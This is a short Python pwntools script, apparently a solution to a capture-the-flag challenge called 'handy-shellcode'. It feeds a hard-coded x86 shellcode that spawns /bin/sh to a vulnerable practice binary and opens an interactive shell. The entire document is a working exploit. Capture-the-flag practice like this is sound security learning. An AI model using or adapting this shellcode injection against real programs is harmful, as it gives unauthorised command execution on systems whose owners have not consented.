from pwn import *

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";
sock = process("/problems/handy-shellcode_0_5b4ef0412a7037a82710e9998530855b/vuln")
#sock = process("vuln")
sock.sendline(shellcode)

sock.interactive()
